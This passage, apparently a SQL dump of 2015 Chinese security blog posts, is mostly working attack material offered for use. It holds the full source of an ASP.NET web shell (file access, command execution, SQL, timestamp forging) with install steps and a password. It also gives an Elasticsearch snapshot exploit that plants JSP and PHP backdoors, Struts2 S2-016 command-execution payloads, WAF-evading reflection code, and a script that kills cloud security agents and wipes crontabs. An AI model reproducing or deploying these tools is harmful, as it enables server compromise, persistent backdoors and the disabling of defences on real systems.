System.Data;\nusing System.Configuration;\nusing System.Web;\nusing System.IO;\nusing System.Text;\nusing System.Net;\nusing System.Diagnostics;\nusing System.Data.SqlClient;\nnamespace WooYun\n{\n    public class Customize\n    {\n        public static void CP(string S, string D)\n        {\n            if (Directory.Exists(S))\n            {\n                DirectoryInfo m = new DirectoryInfo(S);\n                Directory.CreateDirectory(D);\n                foreach (FileInfo F in m.GetFiles())\n                {\n                    File.Copy(S + &quot;\\\\&quot; + F.Name, D + &quot;\\\\&quot; + F.Name);\n                }\n                foreach (DirectoryInfo F in m.GetDirectories())\n                {\n                    CP(S + &quot;\\\\&quot; + F.Name, D + &quot;\\\\&quot; + F.Name);\n                }\n            }\n            else\n            {\n                File.Copy(S, D);\n            }\n        }\n        public static void Request()\n        {\n            HttpContext context = HttpContext.Current;\n            HttpRequest request = context.Request;\n            HttpResponse response = context.Response;\n            string Z = request.Form[&quot;023&quot;];\n            if (Z != &quot;&quot;)\n            {\n                string Z1 = request.Form[&quot;Z1&quot;];\n                string Z2 = request.Form[&quot;Z2&quot;];\n                string R = &quot;&quot;;\n                try\n                {\n                    switch (Z)\n                    {\n                        case &quot;A&quot;:\n                            {\n                                string[] c = Directory.GetLogicalDrives();\n                                R = string.Format(&quot;{0}\\t&quot;, context.Server.MapPath(&quot;/&quot;));\n                                for (int i = 0; i &lt; c.Length; i++)\n                                    R += c[i][0] + &quot;:&quot;;\n                                break;\n                            }\n                        case &quot;B&quot;:\n                            {\n                                DirectoryInfo m = new DirectoryInfo(Z1);\n                                foreach (DirectoryInfo D in m.GetDirectories())\n                                {\n                                    R += string.Format(&quot;{0}/\\t{1}\\t0\\t-\\n&quot;, D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;));\n                                }\n                                foreach (FileInfo D in m.GetFiles())\n                                {\n                                    R += string.Format(&quot;{0}\\t{1}\\t{2}\\t-\\n&quot;, D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;), D.Length);\n                                }\n                                break;\n                            }\n                        case &quot;C&quot;:\n                            {\n                                StreamReader m = new StreamReader(Z1, Encoding.Default);\n                                R = m.ReadToEnd();\n                                m.Close();\n                                break;\n                            }\n                        case &quot;D&quot;:\n                            {\n                                StreamWriter m = new StreamWriter(Z1, false, Encoding.Default);\n                                m.Write(Z2);\n                                R = &quot;1&quot;;\n                                m.Close();\n                                break;\n                            }\n                        case &quot;E&quot;:\n                            {\n                                if (Directory.Exists(Z1))\n                                    Directory.Delete(Z1, true);\n                                else\n                                    File.Delete(Z1);\n                                R = &quot;1&quot;;\n                                break;\n                            }\n                        case &quot;F&quot;:\n                            {\n                                response.Clear();\n                                response.Write(&quot;\\x2D\\x3E\\x7C&quot;);\n                                response.WriteFile(Z1);\n                                response.Write(&quot;\\x7C\\x3C\\x2D&quot;);\n                                goto End;\n                            }\n                        case &quot;G&quot;:\n                            {\n                                byte[] B = new byte[Z2.Length / 2];\n                                for (int i = 0; i &lt; Z2.Length; i += 2)\n                                {\n                                    B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);\n                                }\n                                FileStream fs = new FileStream(Z1, FileMode.Create);\n                                fs.Write(B, 0, B.Length);\n                                fs.Close();\n                                R = &quot;1&quot;;\n                                break;\n                            }\n                        case &quot;H&quot;:\n                            {\n                                CP(Z1, Z2); R = &quot;1&quot;;\n                                break;\n                            }\n                        case &quot;I&quot;:\n                            {\n                                if (Directory.Exists(Z1))\n                                {\n                                    Directory.Move(Z1, Z2);\n                                }\n                                else\n                                {\n                                    File.Move(Z1, Z2);\n                                }\n                                break;\n                            }\n                        case &quot;J&quot;:\n                            {\n                                Directory.CreateDirectory(Z1);\n                                R = &quot;1&quot;;\n                                break;\n                            }\n                        case &quot;K&quot;:\n                            {\n                                DateTime TM = Convert.ToDateTime(Z2);\n                                if (Directory.Exists(Z1))\n                                {\n                                    Directory.SetCreationTime(Z1, TM);\n                                    Directory.SetLastWriteTime(Z1, TM);\n                                    Directory.SetLastAccessTime(Z1, TM);\n                                }\n                                else\n                                {\n                                    File.SetCreationTime(Z1, TM);\n                                    File.SetLastWriteTime(Z1, TM);\n                                    File.SetLastAccessTime(Z1, TM);\n                                }\n                                R = &quot;1&quot;;\n                                break;\n                            }\n                        case &quot;L&quot;:\n                            {\n                                HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1));\n                                RQ.Method = &quot;GET&quot;;\n                                RQ.ContentType = &quot;application/x-www-form-urlencoded&quot;;\n                                HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();\n                                Stream WF = WB.GetResponseStream();\n                                FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write);\n                                int i;\n                                byte[] buffer = new byte[1024];\n                                while (true)\n                                {\n                                    i = WF.Read(buffer, 0, buffer.Length);\n                                    if (i &lt; 1) break; FS.Write(buffer, 0, i);\n                                }\n                                WF.Close();\n                                WB.Close();\n                                FS.Close();\n                                R = &quot;1&quot;;\n                                break;\n                            }\n                        case &quot;M&quot;:\n                            {\n                                System.Diagnostics.ProcessStartInfo c = new System.Diagnostics.ProcessStartInfo(Z1.Substring(2));\n                                System.Diagnostics.Process e = new System.Diagnostics.Process();\n                                System.IO.StreamReader OT, ER;\n                                c.UseShellExecute = false;\n                                c.RedirectStandardOutput = true;\n                                c.RedirectStandardError = true;\n                                e.StartInfo = c;\n                                c.Arguments = string.Format(&quot;{0} {1}&quot;, Z1.Substring(0, 2), Z2);\n                                e.Start();\n                                OT = e.StandardOutput;\n                                ER = e.StandardError;\n                                e.Close();\n                                R = OT.ReadToEnd() + ER.ReadToEnd();\n                                break;\n                            }\n                        case &quot;N&quot;:\n                            {\n                                String strDat = Z1.ToUpper();\n                                SqlConnection Conn = new SqlConnection(Z1);\n                                Conn.Open();\n                                R = Conn.Database + &quot;\\t&quot;;\n                                Conn.Close();\n                                break;\n                            }\n                        case &quot;O&quot;:\n                            {\n                                String[] x = Z1.Replace(&quot;\\r&quot;, &quot;&quot;).Split(&#039;\\n&#039;);\n                                String strConn = x[0], strDb = x[1];\n                                SqlConnection Conn = new SqlConnection(strConn);\n                                Conn.Open();\n                                DataTable dt = Conn.GetSchema(&quot;Columns&quot;);\n                                Conn.Close();\n                                for (int i = 0; i &lt; dt.Rows.Count; i++)\n                                {\n                                    R += String.Format(&quot;{0}\\t&quot;, dt.Rows[i][2].ToString());\n                                }\n                                break;\n                            }\n                        case &quot;P&quot;:\n                            {\n                                String[] x = Z1.Replace(&quot;\\r&quot;, &quot;&quot;).Split(&#039;\\n&#039;), p = new String[4];\n                                String strConn = x[0], strDb = x[1], strTable = x[2];\n                                p[0] = strDb;\n                                p[2] = strTable;\n                                SqlConnection Conn = new SqlConnection(strConn);\n                                Conn.Open();\n                                DataTable dt = Conn.GetSchema(&quot;Columns&quot;, p);\n                                Conn.Close();\n                                for (int i = 0; i &lt; dt.Rows.Count; i++)\n                                {\n                                    R += String.Format(&quot;{0} ({1})\\t&quot;, dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());\n                                }\n                                break;\n                            }\n                        case &quot;Q&quot;:\n                            {\n                                String[] x = Z1.Replace(&quot;\\r&quot;, &quot;&quot;).Split(&#039;\\n&#039;);\n                                String strDat, strConn = x[0], strDb = x[1];\n                                int i, c;\n                                strDat = Z2.ToUpper();\n                                SqlConnection Conn = new SqlConnection(strConn);\n                                Conn.Open();\n                                if (strDat.IndexOf(&quot;SELECT &quot;) == 0 || strDat.IndexOf(&quot;EXEC &quot;) == 0 || strDat.IndexOf(&quot;DECLARE &quot;) == 0)\n                                {\n                                    SqlDataAdapter OD = new SqlDataAdapter(Z2, Conn);\n                                    DataSet ds = new DataSet(); OD.Fill(ds);\n                                    if (ds.Tables.Count &gt; 0)\n                                    {\n                                        DataRowCollection rows = ds.Tables[0].Rows;\n                                        for (c = 0; c &lt; ds.Tables[0].Columns.Count; c++)\n                                        {\n                                            R += String.Format(&quot;{0}\\t|\\t&quot;, ds.Tables[0].Columns[c].ColumnName.ToString());\n                                        }\n                                        R += &quot;\\r\\n&quot;; for (i = 0; i &lt; rows.Count; i++)\n                                        {\n                                            for (c = 0; c &lt; ds.Tables[0].Columns.Count; c++)\n                                            {\n                                                R += String.Format(&quot;{0}\\t|\\t&quot;, rows[i][c].ToString());\n                                            }\n                                            R += &quot;\\r\\n&quot;;\n                                        }\n                                    }\n                                    ds.Clear();\n                                    ds.Dispose();\n                                }\n                                else\n                                {\n                                    SqlCommand cm = Conn.CreateCommand();\n                                    cm.CommandText = Z2;\n                                    cm.ExecuteNonQuery();\n                                    R = &quot;Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n&quot;;\n                                }\n                                Conn.Close();\n                                break;\n                            }\n                        default:\n                            goto End;\n                    }\n                }\n                catch (Exception E)\n                {\n                    R = &quot;ERROR:// &quot; + E.Message;\n                }\n                response.Write(&quot;\\x2D\\x3E\\x7C&quot; + R + &quot;\\x7C\\x3C\\x2D&quot;);\n            End: ;\n            }\n            response.End();\n        }\n    }\n    public class CustomizeHttpHandler : IHttpHandler\n    {\n        public bool IsReusable\n        {\n            get\n            {\n                return true;\n            }\n        }\n        public void ProcessRequest(HttpContext context)\n        {\n            Customize.Request();\n        }\n    }\n    public class CustomizeHttpModule : IHttpModule\n    {\n        #region IHttpModule 成员\n        public void Dispose()\n        {\n        }\n        public void Init(HttpApplication context)\n        {\n            context.BeginRequest += new EventHandler(context_BeginRequest);\n        }\n        void context_BeginRequest(object sender, EventArgs e)\n        {\n            Customize.Request();\n        }\n        #endregion\n    }\n}</pre>\n<p><p class=\"p1\"><strong>四：安装方法</strong></p></p>\n<p><p class=\"p1\">global.asax是不需要编译的，所以直接忽略。</p></p>\n<p><p class=\"p1\">httpHandlers和httpModules配置方式：</p></p>\n<p><p class=\"p1\">1、自行编译上面的cs文件dll</p></p>\n<p><p class=\"p1\">2、复制dll到bin目录</p></p>\n<p><p class=\"p1\">3、修改上述配置，并仔细检查</p></p>\n<p><p class=\"p1\">或：</p></p>\n<p><p class=\"p1\">1、直接新建个Customize.cs文件</p></p>\n<p><p class=\"p1\">2、复制Customize.cs文件到App_Code目录</p></p>\n<p><p class=\"p1\">3、修改上述配置，并仔细检查</p></p>\n<p><p class=\"p1\"><strong>连接：</strong></p></p>\n<p><p class=\"p1\">1、菜刀连接的时候必须选Customize：</p></p>\n<p><p class=\"p1\">2、httpHandlers 可以自己指定后缀，比如你配置了.api请求那么可以http://xx.com/123456.api做为shell地址，可能会有不能拦截除aspx的情况</p></p>\n<p><p class=\"p1\">3、httpModules可以随便访问一个只要不是静态文件的链接(比如jpg文件不允许被POST) 可以访问:http://xx.com/123456.xxx</p></p>\n<p><p class=\"p1\">4、连接密码:023</p></p>', null, '2015-06-15 12:33:38', '1', '939', null, '0', '2015-06-15 14:54:31'), ('1766', '1', '14', 'IP、域名、子域名TOP3000库', '园长', '<p style=\"text-align: left;\">app_ip_lookup.sql这个直接是SQL文件数据量400W+。IP段来自<a href=\"https://db-ip.com/db/\">https://db-ip.com/db/</a> IP经纬度数据来自<a href=\"http://dev.maxmind.com/geoip/legacy/geolite/\">http://dev.maxmind.com/geoip/legacy/geolite/</a> 国内数据来自<a href=\"http://ip.taobao.com/\">http://ip.taobao.com/</a> IP数据变动太快，有点差异很正常。db-ip的IP段好像只划到了0-223.29.206.255 漏了些国内的。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/06/1.jpg\"><img class=\"alignnone size-full wp-image-1767\" src=\"http://javaweb.org/wp-content/uploads/2015/06/1.jpg\" alt=\"1\" width=\"985\" height=\"660\" /></a></p>\n<p>IP地址是long，可以用select INET_NTOA(ip_start_int),INET_NTOA(ip_end_int) from app_ip_lookup 自己转。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/06/2.jpg\"><img class=\"alignnone size-full wp-image-1768\" src=\"http://javaweb.org/wp-content/uploads/2015/06/2.jpg\" alt=\"2\" width=\"1198\" height=\"710\" /></a></p>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1c0k5bBq\">app_ip_lookup.sql.zip</a></p>\n<p>域名库：</p>\n<p>这个是我上次发的那个<a href=\"http://javaweb.org/?p=1698\">1.9亿域名A记录(主域名:1.18亿，子域名7300万)</a>的所有主域名主域名解析记录，数据格式是JSON。我重新解析了下所有的主域名，成功的有7000W+失败差不多4000W。当然失败的原因可能有的域名已过期删除了也可能是犹豫网络原因或者只解析了www通过xxx.com无法解析的情况。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/06/3.jpg\"><img class=\"alignnone size-full wp-image-1769\" src=\"http://javaweb.org/wp-content/uploads/2015/06/3.jpg\" alt=\"3\" width=\"985\" height=\"660\" /></a></p>\n<p>格式：ip地址，主机名，计算机名，域名,解析失败的会过些天再解析一次。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/06/4.jpg\"><img class=\"alignnone size-full wp-image-1770\" src=\"http://javaweb.org/wp-content/uploads/2015/06/4.jpg\" alt=\"4\" width=\"332\" height=\"49\" /></a></p>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1sjKCxGT\">dns.zip</a></p>\n<p>子域名TOP3000最近更新了下，删除了大量可能是垃圾的域名。具体的排名如下：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/06/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BC%80top3000.txt\">子域名前缀top3000.txt</a></p>', null, '2015-06-24 11:13:04', '1', '818', null, '5', '2015-06-24 11:48:57'), ('1779', '1', '13', 'elasticsearch Snapshot And Restore缺陷利用', '园长', 'elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。\n<p>基础信息:</p>\n<p>可以查看es节点信息，包括安装目录：http://localhost:9200/_nodes</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/07/1.png\"><img class=\"alignnone size-full wp-image-1780\" src=\"http://javaweb.org/wp-content/uploads/2015/07/1.png\" alt=\"1\" width=\"797\" height=\"773\" /></a></p>\n<p>未授权访问的elasticsearch(事实上绝大多数都没做访问授权)备份数据的时候存在一些小缺陷，可以用来进一步的获取权限。</p>\n<p>参考es官方的索引快找和恢复文档(Snapshot And Restore)：</p>\n<p>http://www.elastic.co/guide/en/elasticsearch/reference/current/modules-snapshots.html#_snapshot</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/07/2.png\"><img class=\"alignnone size-full wp-image-1781\" src=\"http://javaweb.org/wp-content/uploads/2015/07/2.png\" alt=\"2\" width=\"1098\" height=\"684\" /></a></p>\n<p>大概意思是说：</p>\n<p>快照和恢复模块可以创建单独的索引或整个集群索引的快照到远程仓库。最初的es只提供了把数据备份到共享文件系统，但是现在的es可以通过官方的后端插件备份。</p>\n<p>首先创建一份恶意的索引文档(key为jsp一句话后门)：</p>\n<pre class=\"brush: java; gutter: true\">curl -XPOST http://localhost:9200/yz.jsp/yz.jsp/1 -d&#039;\n{&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;&quot;:&quot;test&quot;}\n&#039;</pre>\n<p>查看创建的文档： curl http://localhost:9200/yz.jsp/_search?pretty</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/07/3.png\"><img class=\"alignnone size-full wp-image-1782\" src=\"http://javaweb.org/wp-content/uploads/2015/07/3.png\" alt=\"3\" width=\"966\" height=\"489\" /></a></p>\n<p>这里的我创把文档的index和type都设置成了yz.jsp,其中文档的key包含了一个jsp文件。</p>\n<p>然后创建一个恶意的存储库(Repositories)：</p>\n<pre class=\"brush: java; gutter: true\">curl -XPUT &#039;http://localhost:9200/_snapshot/yz.jsp&#039; -d &#039;{\n     &quot;type&quot;: &quot;fs&quot;,\n     &quot;settings&quot;: {\n          &quot;location&quot;: &quot;/Users/yz/Documents/install/apache-tomcat-7.0.57/webapps/wwwroot/&quot;,\n          &quot;compress&quot;: false\n     }\n}&#039;</pre>\n<p>这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</p>\n<p>既然知道可以创建任意目录，或许就可以想办法写个shell。</p>\n<p>存储库验证并创建:</p>\n<pre class=\"brush: java; gutter: true\">curl -XPUT &quot;http://localhost:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#039;{\n     &quot;indices&quot;: &quot;yz.jsp&quot;,\n     &quot;ignore_unavailable&quot;: &quot;true&quot;,\n     &quot;include_global_state&quot;: false\n}&#039;</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/07/4.png\"><img class=\"alignnone size-full wp-image-1785\" src=\"http://javaweb.org/wp-content/uploads/2015/07/4.png\" alt=\"4\" width=\"593\" height=\"280\" /></a></p>\n<p>这个时候就可以看到tomcat目录的备份文件已经生成了多个jsp文件：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/07/5.png\"><img class=\"alignnone size-full wp-image-1786\" src=\"http://javaweb.org/wp-content/uploads/2015/07/5.png\" alt=\"5\" width=\"917\" height=\"677\" /></a></p>\n<p>一句话shell在/Users/yz/Documents/install/apache-tomcat-7.0.57/webapps/wwwroot/indices/yz.jsp/snapshot-yz.jsp:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/07/6.png\"><img class=\"alignnone size-full wp-image-1787\" src=\"http://javaweb.org/wp-content/uploads/2015/07/6.png\" alt=\"6\" width=\"1291\" height=\"178\" /></a></p>\n<p>写大马:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/07/7.png\"><img class=\"alignnone size-full wp-image-1788\" src=\"http://javaweb.org/wp-content/uploads/2015/07/7.png\" alt=\"7\" width=\"1439\" height=\"775\" /></a></p>\n<p>这里有2个点：</p>\n<p>1、json不好绕过避开json应该是不可能了，所以避开双引号比较麻烦所以这里用了byte转String避免出现”\"。</p>\n<p>2、如果不把compress设置成false会被es安全过滤(比如：toString、getXXX都会被过滤)，绕了半天才发现设置成不压缩就可以了......</p>\n<p>在PHP环境下利用：</p>\n<pre class=\"brush: actionscript3; gutter: true\">curl -XDELETE http://localhost:9200/test.php</pre>\n<pre class=\"brush: actionscript3; gutter: true\">curl -XDELETE http://localhost:9200/_snapshot/test.php</pre>\n<pre class=\"brush: php; gutter: true\">curl -XPOST http://localhost:9200/test.php/test.php/1 -d&#039;\n{&quot;&lt;?php eval($_POST[chr(97)]);?&gt;&quot;:&quot;test&quot;}&#039;</pre>\n<pre class=\"brush: php; gutter: true\">curl http://localhost:9200/test.php/_search?pretty</pre>\n<pre class=\"brush: php; gutter: true\">curl -XPUT &#039;http://localhost:9200/_snapshot/test.php&#039; -d &#039;{\n     &quot;type&quot;: &quot;fs&quot;,\n     &quot;settings&quot;: {\n          &quot;location&quot;: &quot;/data/httpd/htdocs/default&quot;,\n          &quot;compress&quot;: false\n     }\n}&#039;</pre>\n<pre class=\"brush: php; gutter: true\">curl -XPUT &quot;http://localhost:9200/_snapshot/test.php/test.php&quot; -d &#039;{\n     &quot;indices&quot;: &quot;test.php&quot;,\n     &quot;ignore_unavailable&quot;: &quot;true&quot;,\n     &quot;include_global_state&quot;: false\n}&#039;</pre>\n<p>测试案例：</p>\n<p><img class=\"alignnone size-full wp-image-1789\" src=\"http://javaweb.org/wp-content/uploads/2015/07/8.jpg\" alt=\"8\" width=\"505\" height=\"292\" /></p>\n<p>一句话连接，密码a</p>\n<p>elasticsearch1.6已经修复:<a href=\"https://www.elastic.co/blog/elasticsearch-1-6-0-released#fs-config\">https://www.elastic.co/blog/elasticsearch-1-6-0-released#fs-config</a></p>', null, '2015-07-08 11:00:41', '1', '849', null, '0', '2015-07-08 11:00:41'), ('1797', '1', '13', 'app_feature web应用特征识别库', '园长', '这是一个规则为json版的web应用特征识别库，直接导入mysql即可使用。数据来源<a href=\"http://fofa.so\">http://fofa.so</a>，有部分增减。\r\n<p>\r\n	<img class=\"alignnone size-full wp-image-1795\" src=\"http://javaweb.org/wp-content/uploads/2015/08/1.jpg\" alt=\"1\" width=\"1187\" height=\"632\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	下载地址: <a class=\"ke-insertfile\" href=\"/uploads/file/20170330/20170330092456_926.sql\" target=\"_blank\">/uploads/file/20170330/20170330092456_926.sql</a>&nbsp;\r\n</p>', null, '2015-08-05 13:23:52', '1', '899', null, '12', '2015-08-05 13:24:06'), ('1806', '1', '3', 'java inputstream toString', '园长', '在以前的众多执行利用代码当中获取命里执行结果一直是一个比较麻烦的事情，常见的byte/char[50000]、readFully、readLine但总会有很多不便,比如说readLine的while循环读取问题。使用java.util.Scanner(xxx).useDelimiter(xxx)可以快速解决命令执行回显问题。\n<pre class=\"brush: java; gutter: true\">\nimport java.io.IOException;\nimport java.io.InputStream;\npublic class Exec {\n	public static void main(String[] args) {\n		try {\n			InputStream in = Runtime.getRuntime().exec(&quot;ifconfig&quot;).getInputStream();\n			java.util.Scanner s = new java.util.Scanner(in).useDelimiter(&quot;\\\\A&quot;);\n			System.out.println(s.hasNext() ? s.next() : &quot;&quot;);\n		} catch (IOException e) {\n			e.printStackTrace();\n		}\n	}\n}\n</pre>\n<p>利用Scanner读取文件内容到String:</p>\n<pre class=\"brush: java; gutter: true\">\nString text = new Scanner( new File(&quot;poem.txt&quot;), &quot;UTF-8&quot; ).useDelimiter(&quot;\\\\Z&quot;).next();&gt;\n</pre>\n<p>POC简写:</p>\n<pre class=\"brush: java; gutter: true\">\nredirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%23req.getParameter(%27cmd%27).toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}&amp;cmd=ls%20-la\n</pre>\n<p>参数:cmd是需要执行的命令，windows下执行dir之类的命令的时候需要带上cmd /c dir,linux同理:/bin/sh -c xxx哦</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/08/11.jpg\"><img class=\"alignnone size-full wp-image-1807\" src=\"http://javaweb.org/wp-content/uploads/2015/08/11.jpg\" alt=\"1\" width=\"1409\" height=\"640\" /></a></p>', null, '2015-08-25 07:30:32', '1', '796', null, '0', '2015-08-31 18:23:21'), ('1812', '1', '10', 'URL.zip', '园长', '这是3月-5月的URL数据，包含大量的完整URL链接压缩包。每个文件3E+URL，解压后15-17G。\n<p><a href=\"http://pan.baidu.com/s/1c0k9vGW\">20150331-http.url.zip</a></p>\n<p><a href=\"http://pan.baidu.com/s/1hqF7BYs\">url.txt.zip</a></p>\n<pre>\n[root@localhost http]# head 20150331-http.url\nhttps://67.32.8.22.innotrac.com/\nhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\nhttp://www.w3.org/1999/xhtml\nhttp://174.93.96.86/js/jquery-1.3.1.min.js\nhttp://174.93.96.86/js/common.js\nhttp://174.93.96.86/js/class.js\nhttp://174.93.96.86/js/main.js\nhttp://174.93.96.86/js/jcookie.js\nhttp://174.93.96.86/js/language.js\nhttp://174.93.96.86/css/main.css\n</pre>', null, '2015-08-25 21:40:31', '1', '740', null, '3', '2015-08-25 21:40:31'), ('1822', '1', '10', '卸载云盾', '园长', '<a href=\"https://v2ex.com/t/217931\">由此次阿里云事件谈粗暴的安全防护手段</a>\n<p>阿里云:</p>\n<pre class=\"brush: java; gutter: true\">\na ) wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh \nb ) chmod +x quartz_uninstall.sh \nc ) ./quartz_uninstall.sh\n</pre>\n<p>腾讯云:</p>\n<pre class=\"brush: java; gutter: true\">\n#!/bin/bash \n#fuck tx process \nrm -rf /usr/local/sa \nrm -rf /usr/local/agenttools \nrm -rf /usr/local/qcloud \nprocess=(sap100 secu-tcs-agent sgagent64 barad_agent agent agentPlugInD pvdriver ) \nfor i in ${process[@]} \ndo \nfor A in $(ps aux |grep $i |grep -v grep |awk \'{print $2}\') \ndo \nkill -9 $A \ndone \ndone \nchkconfig --level 35 postfix off \nservice postfix stop \necho \'\'>/var/spool/cron/root \necho \'#!/bin/bash\' >/etc/rc.local\n</pre>', null, '2015-09-11 22:54:55', '1', '731', null, '2', '2015-09-11 22:56:29'), ('1827', '1', '14', 'java reflect cmd', '园长', '看了 @<a href=\"http://zone.wooyun.org/user/%E5%8A%A8%E5%90%8E%E6%B2%B3\" target=\"_blank\">动后河</a> <a href=\"http://zone.wooyun.org/content/23043\" target=\"_blank\">jsp上传cmd马却遇到防火墙的绕过方法</a>，很久以前和 @<a href=\"http://zone.wooyun.org/user/xcoder\" target=\"_blank\">xcoder</a> 师傅搞过类似的东东。贴出我的执行CMD利用代码：\n<pre class=\"brush: java; gutter: true\">\nimport java.io.InputStream;\nimport java.lang.reflect.Method;\nimport java.util.Scanner;\npublic class ReflectTest {\n	public static String reflect(String str) throws Exception {\n		String runtime = new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 });\n		Class&lt;?&gt; c = Class.forName(runtime);\n		Method m1 = c.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 }));\n		Method m2 = c.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class);\n		Object obj2 = m2.invoke(m1.invoke(null, new Object[] {}), new Object[] { str });\n		Method m = obj2.getClass().getMethod(new String(new byte[] { 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109 }));\n		m.setAccessible(true);\n		Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[] {})).useDelimiter(&quot;\\\\A&quot;);\n		return s.hasNext() ? s.next() : &quot;&quot;;\n	}\n	public static void main(String[] args) throws Exception {\n		String str = reflect(&quot;ping -c 3 baidu.com&quot;);\n		System.out.println(str);\n	}\n}\n</pre>\n<p>代码中除了反射就没有其他敏感的方法。执行结果和直接调用exec是一样的，可再表层绕过某些呆滞的waf.</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/09/1.jpg\"><img class=\"alignnone size-full wp-image-1829\" src=\"http://javaweb.org/wp-content/uploads/2015/09/1.jpg\" alt=\"1\" width=\"1076\" height=\"652\" /></a></p>\n<p>好久没发帖了，水一下。顺便发个s2-016比较好用的POC:<a href=\"http://p2j.cn/?p=1806\" target=\"_blank\">java inputstream toString</a></p>\n<pre class=\"brush: java; gutter: true\">\nredirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%23req.getParameter(%27cmd%27).toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}&amp;cmd=ls%20-la\n</pre>\n<p>替换了某些敏感的代码，然后利用java.util.Scanner去读取执行后的结果(InputStream)就再也不用担心怎么readLine了，比readFully更加方便实用。</p>', null, '2015-09-20 05:30:01', '1', '855', null, '1', '2015-09-20 19:15:42'), ('1835', '1', '10', 'DNS Records (ANY)', '园长', '这是一个来自Rapid7的LDNS库，包含了大约5亿域名A记录.\r\n<p>\r\n	Dataset Details\r\n</p>\r\n<p>\r\n	The dataset contains snapshots taken within a timeframe of maximum 8 hours each. New snapshots will be added as additional data is collected. The forward DNS requests are made with record type \'ANY\' which results in all kinds of result records being returned. The first upload contained only the following types: A, AAAA, CNAME, MX, NS, PTR, SOA, TXT. Since then we\'ve changed the parsing library (ldns) and are now uploading all records we retrieve, as far parsed as possible. The data might contain unknown record types and known but incorrect ones next to all the different parsed types.\r\n</p>\r\n<p>\r\n	<a href=\"https://scans.io/study/sonar.fdns\">https://scans.io/study/sonar.fdns</a> \r\n</p>\r\n<p>\r\n	<a href=\"http://pan.baidu.com/s/1qWFvtJQ\">http://pan.baidu.com/s/1qWFvtJQ</a> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>', null, '2015-09-29 00:08:17', '1', '721', null, '0', '2015-09-29 00:10:23'), ('1842', '1', '13', 'multipart/form-data PHP和Java通用的WAF绕过方法', '园长', '依旧是multipart/form-data,去年的时候说道了利用PHP的特性去绕过WAF.<a href=\"http://zone.wooyun.org/content/11423\" target=\"_blank\">轻松绕各种WAF的POST注入、跨站防御(比如安全狗)</a>\n<p>原文简单的描述了PHP在处理POST请求的时候会解析multipart/form-data的内容。</p>\n<p>那么这个multipart/form-data到底是个啥呢？</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/11/1.jpg\"><img class=\"alignnone 